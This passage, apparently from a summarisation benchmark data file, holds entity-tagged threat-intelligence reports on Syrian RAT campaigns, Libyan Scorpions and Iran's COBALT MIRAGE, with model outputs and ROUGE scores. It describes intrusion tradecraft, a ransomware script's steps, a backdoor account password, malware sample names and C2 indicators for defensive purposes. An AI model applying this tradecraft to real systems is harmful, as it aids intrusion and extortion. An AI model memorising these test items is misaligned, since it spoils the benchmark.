[DATE] of [DATE] this [DATE] document.3.2.11 . Activist BehaviorIt is worth noting that we have seen evidence of activists trying to carry out [ORG] Denial [ORG] of [ORG] Service attacks on the [ORG] RAT domains and servers , in an effort to overwhelm their resources and cause their connections to timeout . The post below shows a warning from activists about pro - government hacker attacks on Facebook pages , explaining how pro - government groups post links to Trojanized applications in order to infect users The activists announce in the post that they have spotted a [ORG] C&C domain used by the [NORP] Trojans and that they are attacking it to remove all hacked victims.30\u201c\u0644\u0644\u0647\u0627\u0634\u0646\u0623 \u0643\u0627\u0647\u0644\u0644 [DATE] \u0646\u064a\u062f\u0648\u062c\u0648\u0644\u0627 \u0627\u064a\u0627\u062d\u0636\u0644\u0627 \u0639\u064a\u0645\u062c \u0641\u0630\u062d\u0644 \u062a\u0633\u0648\u0647\u0644\u0627 \u0628\u0631\u0636 \u064a\u0631\u0627\u062c \u201d translated as \u201c [WORK_OF_ART] Host [WORK_OF_ART] Attack in progress to remove all hacked victims with help of god\u201d.3.3 . Attribution31Team and positionsFrom many posts , forums and identification videos , it is clear that the group has an organized structure of teams working together , The names and positions outlined below were collected from posts on infiltrated forums or pages . They are all either nicknames or incomplete names that do not enable full identification of the attackers . [ORG] The [ORG] Resistant [ORG] Syrian [ORG] Electronic [ORG] Army [ORG] \u2022 [ORG] Group 1 : [PERSON] Team [PERSON] Hacker and [ORG] Assad [ORG] Penetrations [ORG] Unit [ORG] \u2022 [ORG] Group 2 : [PERSON] Anonymous Syria [PERSON] Al [PERSON] Assad Unit \u2022 Group [CARDINAL] 3 : Management of Electronic Monitoring and Central Tracking UnitGroup1 : [PERSON] Team [PERSON] Hacker and [ORG] Assad [ORG] Penetrations UnitNameShadyFadiSarmadMahmoudPositionHead of [ORG] Assad [ORG] Hacker teamResponsible for raidsResponsible for operations in raids unitAssistant to the head of management unitGirl nickname [ORG] Fidaeya ( redemptionist)Member of support and publishing teamNajmaMember of media and publishing team32Group2 : [PERSON] Anonymous Syria [PERSON] Al [PERSON] Assad UnitNameJabbourHaydaraPositionPublic relations [ORG] managerElectronic ambushes unitAlaa [ORG] MorchedElectronic monitoring unit and follow upAhmadNarimanAliZinaResponsible for team unitResponsible for team unitResponsible for team unitResponsible for team unitDerkachli [PERSON] KordahliAhmad and MoradResponsible for destruction of victim accountsEngaged in attacksGroup3 : Management of Electronic Monitoring and Central Tracking UnitNameKenanOkbaAhmadPositionHead of teamHead of electronic operationsHead of eectronic raidsRitzel ( heart of the lion)Head of electronic penetration operations334 . [PERSON] Kaspersky [PERSON] Lab [PERSON] MENA [PERSON] RAT [PERSON] StatisticsRemote [PERSON] Administration [PERSON] Tool ( RAT ) [NORP] Trojans are malicious programs that allow a remote \u201c operator \u201d to control a system as if he has physical access to that system . Malicious RATs are widely used by different types of cybercriminals ( hacktivists , script - kiddies , and scammers ) and even in some state - sponsored attacks . Some of the most popular RATs are detected by [ORG] Kaspersky products as following : \u2022 Trojan . MSIL.Zapchast , also known as [ORG] Njrat [ORG] \u2022 [ORG] Backdoor . Win32.Bifrose , also known as [ORG] Bitfrose [ORG] \u2022 [ORG] Backdoor . Win32.Fynloski , also known as [ORG] DarkComet [ORG] \u2022 [ORG] Backdoor . Win32.Xtreme , also known as [ORG] XtremratThe statistics below , extracted from [ORG] the [ORG] Kaspersky [ORG] Security [ORG] Network ( [ORG] KSN ) , show the number of RAT infection attacks blocked by [PERSON] Kaspersky [PERSON] Lab products in the MENA ( Middle East North Africa ) \u2022 [CARDINAL] Three countries from MENA are in the DarkComent top [CARDINAL] 10.365 . [ORG] ConclusionSyrian malware has a strong reliance on social engineering and the active development of technologically complex malicious variants . Nevertheless , most of them quickly reveal their true nature when inspected carefully ; and this is one of the main reasons for urging [NORP] Syrian users to be extra vigilant about what they download and to implement a layered defense approach . Antivirus software uses either signature or heuristic - based detection to identify malware . On the one hand , signature detection searches for a unique sequence of bytes that is specific to a piece of malicious code . On the other hand , heuristic detection identifies malware based on program behaviour . In our research we were able to collect [CARDINAL] more [CARDINAL] than [CARDINAL] 100 malware samples used to attack [NORP] Syrian citizens . Although most of these samples are known , cybercriminals rely on a plethora of obfuscation tools and techniques in order to change the malware structure so as to bypass signature scanning and avoid antivirus detection . This proves how critical heuristic technologies are when it comes to protecting against these types of attack . By being able to identify variants of known malware types or even new malware families , [PERSON] Kaspersky [PERSON] Lab security products detected all the collected samples . We expect these attacks to continue and evolve both in quality and quantity . We expect the attackers to start using more advanced techniques to distribute their malware , using malicious documents or drive - by download exploits . With enough funding and motivation they might also be able to get access to [DATE] zero [DATE] day vulnerabilities , which will make their attacks more effective and allow them to target more sensitive or high profile victims . Even though the attackers depend mainly on using known RATs , their rapid improvement and application of obfuscation techniques , [ORG] GUI development for fake applications , and code modification via automated builders , increase the probability that it wo n\u2019t be too long before they start writing their own [NORP] Trojans to take advantage of customized infection capabilities and implement better security evasion . Finally , having a comprehensive and up - to - date antivirus and firewall should be the [ORDINAL] first measure taken by any user that does any type of online activity , especially during these uncertain times when new cyber threats appear almost daily.37Appendix [CARDINAL] 1 : SamplesAll samples tableThe list of sample files has been collected through the infection vectors detailed above ( [ORG] Skype , Facebook , file - sharing , email , etc . ) . The samples have been either generated using automated tools ( RAT server , obfuscation tools ) or developed and bound to RAT files , especially the new samples with graphical content . File information\u2022 Ammazon Internet [PERSON] Security.rar\u2022 [PERSON] Smart Firewall.rar\u2022 SSH VPN.rarurl on facebook and url [LAW] Viber [LAW] fooorpc%E2%80%AEexe%E2%80%AEexe.rarurl [LAW] exe , shitanoxxx.exe , shitano.exe(shitano= the [ORG] devil)Source from friends at www.cyber-arabs.com\u064a\u0646\u0637\u0648\u0644\u0627 \u0646\u0645\u0644\u0623\u0627 \u062c\u0645\u0627\u0646\u0631\u0628.rar (= national security program)-rar pass : [CARDINAL] 111222333 - Internal exe pass : syria123!@#url \u062d\u0626\u0627\u0636\u0641.exe (= scandals ) url \u0628\u064a\u0627\u0643\u0633 \u0633\u0648\u0631\u064a\u0627\u0641 \u062f\u0627\u0636\u0645.zip ( anti skype April2014 \u0645\u0644\u0627\u0633\u0644\u0625\u0627 \u0634\u064a\u062c-\u0645\u0627\u0647.rar ( imp the islamic army ) \u0629\u064a\u0631\u0643\u0633\u0639\u0644\u0627 \u0646\u0643\u0627\u0645\u0654\u0644\u0627\u0627.exe ( military locations ) .\u062f\u0648\u0631\u0628\u064a \u0646\u0645 \u0627\u0645\u0648\u062f \u0644\u0648\u062e\u062f \u0629\u0637\u062e.exe [ORG] Russian [ORG] Federation [ORG] VimpelCom PPPOE(Wireless broadband ) [NORP] Syrian TelecommunicationsEstablishment", "generated_text": "the document; Kaspersky; new malware attacks; Syria; a plethora; methods; their toolbox; malware; social engineering techniques; victims; social networking forums; The victims; different countries; Saudi Arabia; United Arab Emirates; United States; The group; Cyberspace; the need; privacy; security tools; Attacks; the victims; the threat actor; social engineering tricks; social engineering techniques; The group members; different locations; Lebanon; the group; a vast majority; the samples; activist sites; social networking forums; the victims; different countries; the group; Lebanon; the Netherlands; US; Lebanon; social media forums; the victims; Analysis; the use; sophisticated social engineering techniques; RAT; RAT Remote Access Tool; Trojan; Blackshades; The number; malicious files; 110; the attacks; the number; domains; IP addresses; 47; the group; sceptical about suspicious files; the malware; analysis; risk; intrusion; network traffic; tracking; indicators; compromise; this threat; Threat; a multi-layered security approach; up to date security products; sceptical about suspicious files; security systems.", "ref_text": "<START-1>The document discusses malware attacks targeting the Syrian opposition from 2013-2014 attributed to pro-government groups. A variety of Remote Access Trojans (RATs) were used including ShadowTech Rat, Xtreme Rat, NjRat, BitComet Rat, DarkComet Rat, and BlackShades Rat. The attacks rely heavily on social engineering, using fake security software, popular messaging apps, news stories, and activist databases to trick users into running malware. Domains impersonating security sites distribute malware installers bundled with legitimate software. Over 100 malware samples were collected. Older samples were simple RAT executables while newer ones have elaborate GUI elements to appear legitimate. Obfuscation techniques are used to avoid detection. Persistence is achieved by adding malware to startup folders and modifying registry keys. Data exfiltration and command and control occurs via IPs allocated to the state-owned Syrian Telecom Establishment. Some attacks also originate from Russia. The attacks have evolved from simple malware distribution to more sophisticated social engineering. The number of samples, level of organization, and coding techniques continue to advance over time. The report concludes pro-government groups are relentlessly spying on and compromising the Syrian opposition through targeted cyber attacks. Up-to-date antivirus, firewalls, and user awareness training are recommended. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3708206686930091, "gpt3/lexical/rouge_rouge2": 0.06116207951070338, "gpt3/lexical/rouge_rougeL": 0.1702127659574468, "gpt3/lexical/rouge_rougeLsum": 0.1702127659574468, "gpt3_generated_text": ["The article discusses new malware attacks in Syria, where malicious entities are using a variety of methods to hide and operate malware, including social engineering techniques to trick victims into opening malicious files. Victims, often in need of privacy and security tools, fall prey to these attacks on activist sites and social networking forums. The attacks are evolving, with the group using RAT Trojan tools like Dark Comet and Blackshades. The group members are operating from different locations, including Lebanon. The number of malicious files found is 110, with a significant increase in recent attacks. Protection against these attacks is emphasized through a multi-layered security approach and being cautious of suspicious files. The article highlights the need for vigilance and awareness to combat this evolving cyber threat in the region."]}, {"split_name": "test", "sample_id": "test_118", "prompt_text": "Extract the keywords: 2016/9/22Hunting [ORG] Libyan [ORG] Scorpions | Cyberkov | Professional Cybersecurity & Consultation Firm.\uf095 +1 ( [CARDINAL] 888 ) [CARDINAL] 433 - 3113 \uf0e0 info@cyberkov.comHomeServices \uf078RedTeamCSIRT \uf078BlogPress \uf078About \uf078ContactHunting [ORG] Libyan [ORG] ScorpionsHome [ORG] / Hunting Libyan ScorpionsOverviewLibya maybe known in non - stable political system , civil war and militant groups   ghting for the land and oil control but it is de nitely not known in cyber malicious activities , cyber espionage and hacking groups . No parties in [GPE] Libya before this analysis reported to use cyber attacks , malwares nor recruit hackers to spy on their rivals . [DATE] Today we have a di erent story . In [DATE] the [DATE] past [DATE] weeks on [DATE] 6 [DATE] August [DATE] 2016 , [ORG] Cyberkov [ORG] Security Incident Response team ( CSIRT ) received a numerous [ORG] Android malwares operating in di erent areas in [GPE] Libya especially in [GPE] Tripoli and [GPE] Benghazi . The malware spreads very fast using [ORG] Telegram messenger application in smartphones , targeting high - pro le [NORP] Libyan in uential and political   gures . The malware   rst discovery was after a highly [NORP] Libyan in uential [ORG] Telegram account compromised via web [ORG] Telegram using [ORG] IP address from [GPE] Spain . [DATE] The [DATE] following [DATE] day , the attackers spread an [ORG] Android malware binded with legitimate [ORG] Android application from the compromised [ORG] Telegram account to all his contacts pretending it is an important voice message ( misspelled it by \u201c Voice Massege.apk \u201d ) which indicates a non - english ( maybe an [LANGUAGE] Arabic ) attacker . After spreading the malware , more [ORG] Android smartphones has been infected using the same technique ( via [ORG] Telegram ) and then repost the malware again and again making a network of victims . Analysis of this incident led us to believe that this operation and the group behind it which we call [PERSON] Libyan [PERSON] Scorpions is a malware operation in use since [DATE] September [DATE] 2015 and operated by a politically motivated group whose main objective is intelligence gathering , spying on in uentials and political   gures and operate an espionage campaign within [GPE] Libya . Also , the analysis of the incident led to the discovery of multiple malwares targeting [ORG] Android and Windows machines . [ORG] Libyan [ORG] Scorpions threat actors used a set of methods to hide and operate their malwares . They appear not to have highly technical skills but a good social engineering and phishing tricks . The threat actors are not particularly sophisticated , but it is well - understood that such attacks do n\u2019t need to be sophisticated in order to be e ective . To read the full investigation , please download the report below ( In [LANGUAGE] Arabic or [LANGUAGE] English ) . We also have compiled the list of indicators of compromise ( IoCs ) to help security community mitigating this threat.url [ORG] Libyan [ORG] Scorpions | Cyberkov | Professional Cybersecurity & Consultation Firm . \"Using malwares as weapon in an active warzone such as [GPE] Libya , makethe victims easy targets for assassination or kidnapping by tracking theirphysical locations and monitoring them day and night . \"\uf019 DOWNLOAD ENGLISH REPORT\uf019 DOWNLOAD \" [LANGUAGE] ARABIC \" REPORT\uf019 DOWNLOAD INDICATORS LIST \u00a9 [DATE] 2016 [ORG] Cyberkov [ORG] Co. [ORG] Ltd All Rights Reserved . Secured by [ORG] Cyberkov [ORG] RedTeam [ORG] \u0421\u0438\u0431\u0435\u0440\u043a\u043e\u0432 [ORG] \u041a\u043e\u043c\u0430\u043d\u0434\u0430url", "generated_text": "analysis; Cyberkov Security Incident Response team; Libyan Scorpions; mobile malware; Telegram; Libyan; uential; political gures; Telegram messenger application; Android devices; the malware; victims; the attackers; device; a voice message; the malware; the victim; phone; Telegram contacts; a network; victims; the victim; a network; victims; cyber espionage campaign; the attackers; Techniques; techniques; the malware; victims; Active; phishing; controls; tactics; phishing websites; a military; organizations; details; the group; the threat actors; a set; techniques; a set; method; phishing tricks; the malware; Microsoft Office; the threat actors; communication; infrastructure.", "ref_text": "<START-1>The document describes an investigation by Cyberkov Security Incident Response Team (CSIRT) into a malware campaign targeting high-profile Libyan political and influential figures. In August 2016, CSIRT received reports of Android malware spreading in Libya via the Telegram messaging app. The malware was first discovered after a high-profile Telegram account was compromised from an IP address in Spain. The attackers then used the compromised account to spread malware disguised as a voice message to the account's contacts. Analysis revealed this was part of an ongoing politically-motivated malware operation since September 2015, aimed at intelligence gathering and spying. CSIRT named the threat actor group behind it the Libyan Scorpions. The Libyan Scorpions used social engineering and phishing to spread malware targeting Android and Windows devices. The malware allowed them to track locations and monitor targets. While not highly sophisticated technically, these kinds of attacks can still be effective. The report contains further details on the tactics, techniques and procedures used by the Libyan Scorpions. It also includes indicators of compromise to help the security community mitigate this threat. CSIRT notes that using malware to spy on and track individuals in an unstable warzone like Libya puts them at grave risk of assassination or kidnapping. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5484764542936288, "gpt3/lexical/rouge_rouge2": 0.2116991643454039, "gpt3/lexical/rouge_rougeL": 0.29916897506925205, "gpt3/lexical/rouge_rougeLsum": 0.29916897506925205, "gpt3_generated_text": ["The article discusses the discovery of a new cyber espionage group called Libyan Scorpions operating in Libya. The group has been spreading Android malware through the popular messaging app, Telegram, targeting high-profile Libyan influential and political figures. The malware was first discovered when a prominent Telegram account was compromised, and the attackers spread the malware to all of the account's contacts. This led to the discovery of multiple malwares targeting Android and Windows devices. The group appears to be politically motivated and their main objective is intelligence gathering and spying on influential and political figures within Libya. The article also mentions that the attackers use social engineering and phishing tricks, rather than highly technical skills, to carry out their attacks. The malware is used as a weapon in the active warzone of Libya, making the victims easy targets for assassination or kidnapping. The article provides a link to download the full in"]}, {"split_name": "test", "sample_id": "test_119", "prompt_text": "Extract the keywords: www.secureworks.com /blog / cobalt - mirage - conducts - ransomware - operations - in - us COBALT MIRAGE Conducts Ransomware Operations in [GPE] U.S. Counter Threat Unit Research Team \u22ee \u22ee 5/12/2022The [NORP] Iranian threat group blurs the line between financially motivated attacks and espionage . [DATE] Thursday , [DATE] May 12 , [DATE] 2022 By : [ORG] Counter [ORG] Threat [ORG] Unit Research TeamSecureworks \u00ae [ORG] Counter [ORG] Threat [ORG] Unit \u2122 ( CTU ) researchers are investigating attacks by the [NORP] Iranian COBALT MIRAGE threat group , which has been operating since [DATE] at [DATE] least [DATE] June [DATE] 2020 . COBALT MIRAGE is linked to the [NORP] Iranian COBALT ILLUSION threat group , which predominantly uses persistent phishing1/10campaigns to obtain initial access . It is possible that the [CARDINAL] two groups share tradecraft and access . Elements of COBALT MIRAGE activity have been reported as [ORG] PHOSPHOROUS and [ORG] TunnelVision . Based on intelligence gained from Secureworks incident response engagements and public reporting , CTU \u2122 researchers identified [CARDINAL] two distinct clusters of COBALT MIRAGE intrusions ( labeled as Cluster A and Cluster B in Figure [CARDINAL] 1 ) . In Cluster A , the threat actors use [ORG] BitLocker and DiskCryptor to conduct opportunistic ransomware attacks for financial gain . Cluster B focuses on targeted intrusions to gain access and collect intelligence , but some of the activity has experimented with ransomware . Figure [CARDINAL] 1 . Clusters of COBALT MIRAGE activity . ( Source : Secureworks)COBALT MIRAGE has demonstrated a preference for attacking organizations in [GPE] Israel , the [GPE] U.S. , [LOC] Europe , and [GPE] Australia . The threat actors obtain initial access via scan - and - exploit activity . In [DATE] 2021 , COBALT MIRAGE scanned ports [DATE] 4443 , [DATE] 8443 , and [DATE] 10443 for devices vulnerable to [ORG] Fortinet [ORG] FortiOS vulnerabilities CVE-2018 - 13379 , CVE-2020 - 12812 , and CVE-2019 - 5591 . From [DATE] late [DATE] September [DATE] 2021 , the group used a broad scan - and - exploit campaign targeting [ORG] Microsoft [ORG] Exchange servers . The threat actors exploited the [ORG] ProxyShell vulnerabilities ( CVE-2021 - 34473 , CVE-2021 - 34523 , and CVE-2021 - 31207 ) to deploy Fast Reverse Proxy client ( [ORG] FRPC ) and enable remote access to vulnerable systems . In [DATE] November [DATE] 2021 , [ORG] the [ORG] U.S. [ORG] Cybersecurity [ORG] and [ORG] Infrastructure [ORG] Security [ORG] Agency ( [ORG] CISA ) released an advisory ( AA21 - 321A ) pertaining to activity that CTU researchers attribute to COBALT MIRAGE . The advisory does not name a specific group , instead referring to an \" [NORP] Iranian government - sponsored [ORG] APT group . \"In [DATE] January [DATE] 2022 , COBALT MIRAGE used access obtained through [ORG] ProxyShell exploitation , possibly conducted in [DATE] late [DATE] 2021 , to enter the network of a [GPE] U.S. philanthropic organization . On [DATE] January [DATE] 6 , the threat actors created and accessed a web shell named aspx_okqmeibjplh.aspx . The format of this filename matches an established pattern associated with COBALT MIRAGE ransomware operations : aspx_[a - z ] { 13}\\.aspx . Attacker - initiated HTTP requests to the web shell used a [ORG] User - Agent named python- requests/2.23.0 , indicating the use of scripts that leverage the Python Requests library . The Python reference is likely due to the threat actors using a Python - based proof - of - concept [ORG] ProxyShell exploit in their initial attack and potentially additional scripted commands during the intrusion . After the threat actors obtained access via the web shell , [CARDINAL] three files were dropped on the web server : [ORG] Wininet.xml , [ORG] Wininet.bat , and dllhost.exe . CTU analysis of [ORG] Wininet.xml revealed it being used to create a2/10scheduled task that launches C:\\Windows\\Wininet.bat . When [ORG] Wininet.bat is launched , it executes C : \\Windows\\dllhost.exe ( see Figure 2).Figure 2 . Process tree showing the execution of dllhost.exe . ( Source : Secureworks)Dllhost.exe is a custom Go binary that references GitHub repositories associated with Fast Reverse Proxy ( [ORG] FRP ) , indicating the binary is based at least in part on this tool . [ORG] FRP is routinely deployed by COBALT MIRAGE . However , dllhost.exe also includes code from other projects and behaves differently from a typical [ORG] FRPC binary . When the threat actors execute dllhost.exe on a compromised [ORG] Exchange server , the binary executes [CARDINAL] three commands as child processes ( see Figure [CARDINAL] 3 ) . These processes collect basic information about the host and establish a tunnel to the defined command and control ( C2 ) servers . There are [CARDINAL] two versions of the same [ORG] PowerShell command . [CARDINAL] One version uses an older PowerShell binary filename . The other uses the pwsh.exe filename implemented in [ORG] PowerShell [ORG] Core [CARDINAL] 6.0 , which was released in [DATE] January [DATE] 2018.Figure [DATE] 3 . [ORG] Commands executed by dllhost.exe . ( Source : Secureworks)Dllhost.exe uses the ' tcp443 . msupdate . us ' and ' kcp53 . msupdate . us ' subdomains for command and control . The inclusion of a protocol ( tcp , kcp ) and port number ( [CARDINAL] 443 , 53 ) is a pattern across COBALT MIRAGE subdomain names . This binary has also been distributed from http : //148 . [CARDINAL] 251 . [CARDINAL] 71 . [CARDINAL] 182 / update_win . In [DATE] December [DATE] 2021 , CTU researchers observed COBALT MIRAGE experimenting with Log4j exploits hosted on [CARDINAL] 148 . [CARDINAL] 251 . [CARDINAL] 71 . 182.The threat actors conducted a [ORG] Local [ORG] Security [ORG] Authority [ORG] Server [ORG] Service ( LSASS ) dump soon after dllhost.exe executed its commands . LSASS is a Windows process that stores local usernames and passwords for authenticated users . Threat actors can use the data to derive valid credentials by brute- force cracking [ORG] New [ORG] Technology LAN Manager ( [ORG] NTLM ) hashes or extracting passwords stored in plain text . CTU researchers ' observations and analysis of these attacks align with [ORDINAL] third - party reporting of other activity that CTU researchers attribute to COBALT MIRAGE . Those reports describe [ORG] ProxyShell being3/10used to deploy web shells and files with the same filenames around the same time period as these attacks . [DATE] Three [DATE] days after deploying dllhost.exe , the threat actors used [ORG] Remote [ORG] Desktop [ORG] Protocol ( RDP ) and a built - in user account ( [ORG] DefaultAccount ) to log onto the compromised [ORG] Exchange server ( see Figure [CARDINAL] 4 ) . This was the [ORDINAL] first login to the server from [ORG] DefaultAccount and could indicate the beginning of threat actor hands - on - keyboard activity . The threat actors then attempted to extract locally cached passwords by again dumping the LSASS process . They enumerated the environment via the SoftPerfect Network Scanner tool using the filename netscanold.exe . Figure [CARDINAL] 4 . COBALT MIRAGE actions in [DATE] January [DATE] 2022 intrusion . ( Source : Secureworks)The threat actors moved laterally and encrypted [CARDINAL] three user workstations with [ORG] BitLocker , rendering them inaccessible to the compromised organization 's staff . Due to an absence of logging and forensic artifacts , the methods used to trigger [ORG] BitLocker in this environment are unclear . However , other COBALT MIRAGE ransomware attacks used a script ( see Figure [CARDINAL] 5 ) to automate the attack.4/10Figure [CARDINAL] 5 . Ransomware attack script used by COBALT MIRAGE to activate [ORG] BitLocker . ( Source : Secureworks)This script performs the following actions : Sets a ' mail= ' variable to a defined contact email address [ORG] Enables [ORG] Terminal [ORG] Services ( renamed [ORG] Remote [ORG] Desktop [ORG] Services after Windows Server 2008 ) Creates a firewall rule to enable RDP access to the host [ORG] Starts [ORG] Terminal [ORG] Services Initiates BitLocker disk encryption Defines a ransom message Adds multiple registry keys related to [ORG] BitLocker and creates a message that displays the ransom message and contact email address Creates a ' [ORG] MSSQL ' user account on the compromised system with password _ AS_@1394 and adds it to the administrators and [ORG] Remote [ORG] Desktop [ORG] Users groupsThe threat actors completed the attack with an unusual tactic of sending a ransom note to a local printer . The note includes a contact email address and [ORG] Telegram account to discuss decryption and recovery ( see Figure [CARDINAL] 6 ) . This approach suggests a small operation that relies on manual processes to map victims to the encryption keys used to lock their data . As of this publication , CTU researchers are not aware of a5/10COBALT [ORG] MIRAGE leak site . Although some [NORP] Iranian - linked attacks against [LOC] Middle [LOC] Eastern organizations in [DATE] 2020 and [DATE] 2021 appeared to use ransomware to cause fear and disruption , the victimology of [LAW] the [LAW] COBALT [LAW] MIRAGE attacks suggests that these threat actors are focused on financial gain . Figure [CARDINAL] 6 . January 2022 COBALT MIRAGE ransom note . ( Source : Secureworks)In [DATE] March [DATE] 2022 , CTU researchers attributed an intrusion in a [GPE] U.S. local government network to COBALT MIRAGE based on the use of a [ORG] DefaultUser user account , deployment of [ORG] FRPC to the victim 's network , and use of infrastructure that matches a pattern associated with COBALT MIRAGE . However , ransomware was not used in the attack . This activity is part of [ORG] Cluster [ORG] B.Analysis [ORG] of [ORG] COBALT [ORG] MIRAGE attacks is challenging because unrelated threat actors have often also compromised the environment using the same vulnerabilities ( e.g. , [ORG] ProxyShell , [ORG] Log4Shell ) . Many of these threat actors use the same publicly available proof - of - concept code and may access the same environment multiple times , dropping redundant web shells . Cryptominer infections are often observed alongside COBALT MIRAGE activity , but they may have been deployed by another group . The initial access vector in the [DATE] March [DATE] 2022 engagement is unclear , but the threat actors likely exploited Log4j vulnerabilities ( CVE-2021 - 44228 , CVE-2021 - 45046 ) on the victim 's [ORG] VMware [ORG] Horizon infrastructure . In [DATE] early [DATE] 2022 , CTU researchers observed multiple threat actors exploiting Log4j vulnerabilities on [ORG] VMware [ORG] Horizon to deploy cryptominers . The initial exploitation by COBALT MIRAGE may have occurred as early as late January 2022 . After obtaining access , COBALT MIRAGE used the [ORG] DefaultAccount user to move laterally within the environment via RDP.Most of the intrusion activity spanned a four - day period in mid - [DATE] March . At [CARDINAL] one point , the threat actors used a system in the victim 's environment to conduct [ORG] Google searches for \" upload file for free \" and then accessed filemail . com , ufile . io , mega . nz , and easyupload . io . Logs indicate that [CARDINAL] one or more of these sites may have been used to exfiltrate data from the environment . The threat actors also downloaded several files ( e.g. , [DATE] 23.zip , pxy.zip , pxy.rar ) onto compromised systems using the easyupload . io and ufile . io file - sharing services . The [FAC] 23.zip file was not available for analysis , but pxy.zip includes a set of files to establish a persistent remote tunnel to an attacker - controlled server via [ORG] FRPC ( see Figure [CARDINAL] 7 ) . The hash of the [ORG] FRPC binary deployed by the threat actors is identical to the binary hash listed in the [DATE] November [DATE] 2021 CISA advisory . Similar to other COBALT MIRAGE domains used in Cluster B , the [CARDINAL] C2 domain in this incident ( my - logford . ml ) is registered with the [GPE] Freenom registrar . Domains in Cluster A are typically registered with Porkbun.6/10Figure 7 . Contents and execution flow of files in pxy.zip . ( Source : Secureworks)Pxy.rar contains the same files as pxy.zip and also includes wmiexec.exe , which is a compiled version of the Python - based wmiexec.py Impacket tool . The threat actors obtained access to multiple accounts within the victim 's environment and downloaded pxy.zip to several hosts to provide redundant access . The [GPE] Ngrok tunneling tool was also deployed within the environment while the COBALT MIRAGE actors were present , but it is unclear if they deployed the tool or if it was deployed by another threat group . [NORP] Iranian threat groups such as COBALT FOXGLOVE have used this tool in the past , but there is no indication that COBALT FOXGLOVE was involved in this intrusion . The threat actors downloaded a network scanner to enumerate the environment , performing a Google search for \" softperfect network scanner portable \" and downloading netscan_portable_v621.zip from mega . nz . The threat actors conducted multiple scans and based the results filename on the [ORG] IP address of the scanned system . The threat actors uploaded the network scans and other tool output to ufile . io . After the [DATE] March [DATE] 2022 intrusion was detected and disrupted , no additional malicious activity was observed . CTU researchers have not directly observed ransomware attacks linked to Cluster B , but there is evidence that those threat actors may be experimenting with ransomware . A file ( rsf.exe ) uploaded to the [ORG] VirusTotal analysis service from [GPE] Iran on [DATE] December 29 , [DATE] 2021 appears to be an unfinished attempt at ransomware . It contains a [ORG] PDB string with an unusual username ( [ORG] C:\\Users\\pugna\\ ) that was also identified in the PowerLessCLR remote access trojan ( RAT ) . This [ORG] RAT has been hosted on the [CARDINAL] 162 . [CARDINAL] 55 . [CARDINAL] 137 . [CARDINAL] 20 IP address used by COBALT MIRAGE . CTU researchers have also observed COBALT MIRAGE infrastructure hosting files related to the [ORG] HiddenTear open - source ransomware family but have not observed the ransomware being deployed to targets . The [DATE] January and [DATE] March incidents typify the different styles of attacks conducted by COBALT MIRAGE . While the threat actors appear to have had a reasonable level of success gaining initial access to a wide range of targets , their ability to capitalize on that access for financial gain or intelligence collection appears limited . At a minimum , COBALT [ORG] MIRAGE 's ability to use publicly available encryption tools for ransomware operations and mass scan - and - exploit activity to compromise organizations creates an ongoing threat . CTU researchers recommend that organizations prioritize patching high - severity and highly publicized vulnerabilities on internet - facing systems , implementing multi - factor authentication , and monitoring for the tools and file - sharing services used by COBALT [TIME] MIRAGE.To mitigate exposure to this malware , CTU researchers recommend that organizations use available controls to review and restrict access using the indicators listed in [LAW] Table [LAW] 1 . Note that [ORG] IP addresses can be7/10reallocated . The domains and [ORG] IP addresses may contain malicious content , so consider the risks before addressContextCOBALT MIRAGE infrastructure registered on [DATE] July 23 , [DATE] 2020 COBALT MIRAGE infrastructure registered on or before [DATE] May 10 , [DATE] 2021 COBALT MIRAGE infrastructure registered on [DATE] June 2 , [DATE] 2021 COBALT MIRAGE infrastructure registered on or before [DATE] December [DATE] 4 , [DATE] 2021 COBALT MIRAGE infrastructure registered on [DATE] December [DATE] 5 , [DATE] 2021 COBALT MIRAGE infrastructure registered on or before [DATE] January 22 , [DATE] 2022 COBALT MIRAGE infrastructure registered on or before [DATE] January 26 , [DATE] 2022 COBALT MIRAGE infrastructure registered on [DATE] January 31 , [DATE] 2022 COBALT MIRAGE infrastructure registered on or before [DATE] February 14 , [DATE] 2022 COBALT MIRAGE infrastructure registered on [DATE] March 13 , [DATE] 2022 COBALT MIRAGE infrastructure registered on or before [DATE] March 14 , [DATE] 2022 Used to register COBALT MIRAGE domain msupdate.us Used to register multiple COBALT MIRAGE domains Hosted multiple COBALT MIRAGE domains in [DATE] late [DATE] 2021 and early 2022 Hosted multiple COBALT MIRAGE domains in [DATE] late [DATE] 2021 and early Filename Scheduled task definition used by Filename COBALT MIRAGE script that runs dllhost.exe COBALT MIRAGE script that runs COBALT MIRAGE script that runs [ORG] Filename [ORG] Custom binary used by COBALT MIRAGE in ransomware attacks [ORG] Custom binary used by COBALT MD5 MIRAGE in ransomware attacks [ORG] Custom binary used by COBALT MIRAGE in ransomware attacks hash Custom binary used by COBALT MIRAGE in ransomware attacks [ORG] Filename [ORG] Archive containing [ORG] FRPC tool and scripts used by [ORG] COBALT [ORG] MIRAGE [ORG] Filename [ORG] Archive containing [ORG] FRPC tool and scripts used by [LAW] COBALT [LAW] MIRAGE [LAW] Filename [LAW] Scheduled task definition used by COBALT MIRAGE Scheduled task definition used by Scheduled task definition used by Scheduled task definition used by [ORG] Filename [ORG] FRPC binary used by COBALT MIRAGE FRPC binary used by COBALT FRPC binary used by COBALT FRPC binary used by COBALT Filename Batch script used by COBALT [ORG] MIRAGE [ORG] Batch script used by COBALT Batch script used by COBALT Batch script used by COBALT Filename Script used by COBALT MIRAGE MD5 Script used by COBALT MIRAGE Filename Lateral movement tool used by COBALT MIRAGE Lateral movement tool used by Lateral movement tool used by [CARDINAL] 7231002dbb69523fad3369SHA256 hashLateral movement tool used by COBALT MIRAGETable 1 . Indicators for this threat.10/10", "generated_text": "Iranian; COBALT MIRAGE; at least June 2020; the group; BitLocker; DiskCryptor; initial access; financial gain; Cluster A; targeted intrusions; intelligence; the group; late September 2021; Microsoft Exchange servers; ProxyShell; Fast Reverse Proxy client; remote access; January 2022; a web shell; APT; a phishing campaign; the threat actors; a Python-based proof-of-concept ProxyShell exploit; a web shell; a web shell; a URL; the infrastructure; the Iranian government; CISA; a summary; phishing; espionage.", "ref_text": "<START-1>The report details intrusion activity by the Iranian threat group COBALT MIRAGE against organizations in the US and other countries. Researchers have identified two clusters of activity - one focused on opportunistic ransomware attacks for financial gain, the other on targeted intrusions for intelligence collection. Initial access is gained via exploits of vulnerabilities like ProxyShell on Exchange servers. Custom malware like the dllhost.exe binary 